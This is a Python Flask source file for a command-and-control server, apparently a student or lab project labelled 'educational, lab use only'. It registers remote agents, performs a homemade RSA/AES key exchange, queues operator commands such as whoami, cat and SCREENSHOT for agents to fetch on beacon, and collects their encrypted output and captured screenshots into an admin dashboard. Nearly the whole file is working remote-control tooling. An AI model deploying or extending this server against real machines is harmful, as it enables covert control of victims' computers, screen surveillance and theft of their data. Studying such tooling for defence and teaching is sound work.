import base64, datetime,os, time,queue,threading,socket,argparse,sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "shared"))
# ---- end path bootstrap ----
import encryptions,PROTOCOLS,OPERATIONS
from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG,SERVER_LOG
from flask import Flask, jsonify, request, render_template_string
from loguru import logger
from log_setup import setup_logging

app = Flask(__name__)
users_in_server = {}

# Define a GET route for the home/root URL- default rooting - just for homepage
@app.route('/', methods=['GET'])
def home():
    logger.debug(request)
    logger.debug(request.data)
    logger.debug(request.method)
    logger.debug(f"the agent id is: {request.headers.get('Agent-Id')}")
    data = request.get_json(silent=True)
    logger.debug(data)
    return "Hello World! Your Flask HTTP server is running."

#the main route for client beacon
@app.route('/getkeys', methods=['GET'])
def get_keys():
    logger.debug("the agent sent beacon for get encryption keys")
    agent_id = request.headers.get('Agent-Id')
    if agent_id in users_in_server:
        users_in_server[agent_id]['last_seen'] = str(datetime.datetime.now())
    else:
        logger.debug(f"first time of the agent {agent_id} at the server")
        users_in_server[agent_id] = {'aes_key':"" , 'ip_addr':f"{request.remote_addr}",
                  "is_encrypted":False , 'last_seen':f'{str(datetime.datetime.now())}'}
    logger.debug(request)
    logger.debug(request.data)
    logger.debug(request.headers)
    data = request.get_json(silent=True)
    #if there is  something at queue but still not encrypted - it may be public key / N

    if users_in_server[agent_id]['is_encrypted'] == False:
        logger.debug("1")
        return jsonify({"public_key": str(public_key), "N": str(N)}), 200
   # elif q.qsize() == 0 and users_in_server[agent_id]['is_encrypted'] == False:
     #   return "empty", 200


@app.route('/getkeys', methods=['POST'])
def handle_json2():
    #the agent sending content
    # Parse incoming JSON payload
    logger.info("the agent sent his aes key")
    agent_id = request.headers.get('Agent-Id')
    data = request.get_json(silent=True)
    logger.debug(request)
    logger.debug(request.get_data())
    logger.debug(request.method)
    logger.debug(request.headers)
    #we recieve the aes key int str, but is actually an int which represent bytes!!
    encrypted_aes = data.get('aes_key_int')
    #decrypt the aes key by the int version
    aes_key_by_client = encryptions.decrypt_with_private_key(N,int(encrypted_aes),privateKey)
    aes_key_str = aes_key_by_client.to_bytes(16,'little')
    # we save the aes key in bytes
    users_in_server[agent_id]['aes_key'] = str(aes_key_by_client)
    users_in_server[agent_id]['is_encrypted'] = 'True'
    if not data:
        return jsonify({"error": "No JSON data provided"}), 400
    else:
        return jsonify({"msg":"success"}),200


@app.route('/getcommands', methods=['POST'])
def handle_json3():
    # Parse incoming JSON payload
    agent_id = request.headers.get('Agent-Id')
    data = request.get_json(silent=True)
    content = (data["content"])
    base_64_decode = base64.b64decode(content)
    iv = int(data["iv"])
    logger.debug(request)
    logger.debug(request.get_data())
    logger.debug(request.method)
    logger.debug(request.headers)
    logger.debug(data)

    iv_byte_length = (iv.bit_length() + 7) // 8
    #content_byte_length = (content.bit_length()+7)//8
    bytes_iv = iv.to_bytes(iv_byte_length,'little')
    #bytes_content = content.to_bytes(content_byte_length,'little')

    aes_key_by_me = int(users_in_server[agent_id]['aes_key'])
    aes_key_by_me_bytes_length = (aes_key_by_me.bit_length() + 7 ) // 8
    bytes_key = aes_key_by_me.to_bytes(16,'little')

    decrypted_content = encryptions.aes_decryption(base_64_decode,bytes_key,bytes_iv)
    unpaded_decrypted_content = encryptions.aes_unpadder(decrypted_content)
    if unpaded_decrypted_content.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
        URL_PIC = str(OUTPUT_IMG)
        try:
            with open(URL_PIC, "wb") as f:
                f.write(unpaded_decrypted_content)
                logger.debug("the img has been received successfully")
        except socket.timeout:
            logger.debug("Timeout occurred")
        except ConnectionResetError:
            logger.debug("Client closed connection")
    else:
        logger.debug("the decrypted content is:\n")
        logger.debug(unpaded_decrypted_content.decode('utf-8'))
        decoded_text = unpaded_decrypted_content.decode('utf-8')
        logger.debug(f"the full content is {unpaded_decrypted_content}and type is {type(unpaded_decrypted_content)}")
        admin_responses.insert(0, {"agent": agent_id, "time": str(datetime.datetime.now().strftime("%H:%M:%S")),
                                   "data": decoded_text})
    if not data:
        return jsonify({"error": "No JSON data provided"}), 400
    # Return a structured JSON response
    return jsonify({"status": "success","received": "success"}), 200


def encrypt_command_with_aes(command: str, aes_key: str) -> bytes:
    iv = encryptions.iv_creator()
    bytes_aes_key = int(aes_key)
    bytes_aes_key_active = bytes_aes_key.to_bytes(16, 'little')
    padded_command = encryptions.aes_padder(command.encode('utf-8'))
    encrypted_command = encryptions.aes_encryption(padded_command, bytes_aes_key_active, iv)
    logger.debug(iv)
    logger.debug(encrypted_command)
    return iv, encrypted_command




@app.route('/getcommands', methods=['GET'])
# if there is something at the queue but encrypted - it has to be command!
def handle_commands_by_client():
    agent_id = request.headers.get('Agent-Id')
    #if i have command at the queue and encryption is valid:
    if q.qsize() != 0 and users_in_server[agent_id]['is_encrypted'] == 'True':
        command_for_client = q.get()
        #should make encryption function
        logger.debug("avilavle command in queue - send it to client")
        time.sleep(3)
        #----------
        #call to the functions:
        iv,encrypted_command = encrypt_command_with_aes(command_for_client,users_in_server[agent_id]['aes_key'])
        iv_base64 = encryptions.base_64_encoder(iv)
        encrypted_command_base64=encryptions.base_64_encoder(encrypted_command)
        #return a strings which is actually an int;s represting of the bytes
        return jsonify({'iv': iv_base64, 'msg': encrypted_command_base64}),200
    elif q.qsize() == 0 and users_in_server[agent_id]['is_encrypted'] == 'True':
        logger.info("3")
        errmsg = "nothing"
        iv, encrypted_command = encrypt_command_with_aes(errmsg, users_in_server[agent_id]['aes_key'])
        iv_base64 = encryptions.base_64_encoder(iv)
        encrypted_command_base64 = encryptions.base_64_encoder(encrypted_command)
        logger.info("the queue is empty")
        return jsonify({'iv': iv_base64, 'msg': encrypted_command_base64}),200


@app.route('/admin', methods=['GET'])
def admin_ui():
    # פותח את קובץ ה-HTML של הממשק
    with open(os.path.join(DASHBOARD_HTML), 'r',
        encoding='utf-8') as f:        return render_template_string(f.read())

@app.route('/api/status', methods=['GET'])
def get_status():
    image_data = None
    # 1. בודקים אם קובץ התמונה ששמרת ב-Socket אכן קיים
    if OUTPUT_IMG.exists():
        try:
            # 2. קוראים את הקובץ במצב בינארי (rb)
            with open(OUTPUT_IMG, 'rb') as img_file:
                # 3. הופכים את הביטים למחרוזת Base64
                b64_string = base64.b64encode(img_file.read()).decode('utf-8')
                # 4. מרכיבים את ה-Data URL שהדפדפן יודע לקרוא
                image_data = f"data:image/png;base64,{b64_string}"
        except Exception as e:
            logger.error(f"Error reading image: {e}")

    # 5. מחזירים את ה-JSON, עם התוספת של התמונה
    return jsonify({
        "agents": users_in_server,
        "queue_size": q.qsize(),
        "responses": admin_responses[:10],
        "latest_image": image_data
    }), 200

@app.route('/api/send_command', methods=['POST'])
def send_command_api():
    data = request.get_json(silent=True)
    command = data.get('command')
    agent_id = data.get('agent_id')

    if command and agent_id in users_in_server:
        q.put(command)  # מכניס לתור הקיים
        return jsonify({"status": "Command added to queue"}), 200
    return jsonify({"error": "Invalid command or agent"}), 400

def run_http_server(host,port):
 app.run(debug=False, host=host, port=port)

#a function which get commands by the admin, stores them at the server queue - and when
# its ok - it send the command to the agent
def send_commands_to_agent(queue):
 while True:
     logger.debug(users_in_server)
     #specifie the command for each agent (client)
     specific_agent = input("please enter your agent")
     #check if we know this agent and he is in encryption modde
     if specific_agent in users_in_server and users_in_server[specific_agent]['is_encrypted'] == 'True':
         logger.debug(users_in_server)
         commands = input("please enter command for the server")
         queue.put(commands)
     else:
         logger.info("encryption not ready yet / no user in the system")

def monitor_server_state(q):
 while True:
     time.sleep(10)
     logger.debug(list(q.queue))
     logger.debug(users_in_server)


#-----------------------------------------------------------------------
#set encryption numbers:
p,q = encryptions.create_pq()
N, totienty = encryptions.create_N_TOTIENT_N(p,q)
public_key = encryptions.create_public_key(totienty)
privateKey = encryptions.generate_private_key(public_key,totienty)
#-----------------------------------------------------------------------

#set the queue to have the N , public_key at the beginning (as commands)
q = queue.Queue()
commands_queue = queue.Queue()
#-----------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(description="HTTP C2 server (educational, lab use only)")
    p.add_argument("--host", default="127.0.0.1", help="Host/IP to bind")
    p.add_argument("--port", type=int, default=5050, help="Port to listen on")
    return p.parse_args()

def main():
    # all the possible commands for the agents
    COMMANDS = {'cat', 'dir', 'whoami', 'SCREENSHOT', 'SEND_IMG'}

    # Initialize the Flask application
    global users_in_server
    global admin_responses
    admin_responses = []

    setup_logging(str(SERVER_LOG))
    args = parse_args()

    t1 = threading.Thread(target=run_http_server, args=(args.host, args.port))
    t2 = threading.Thread(target=send_commands_to_agent, args=(q,))
    t3 = threading.Thread(target=monitor_server_state, args=(q,))
    t1.start()
    time.sleep(1)
    t2.start()
    t3.start()


if __name__ == "__main__":
    main()



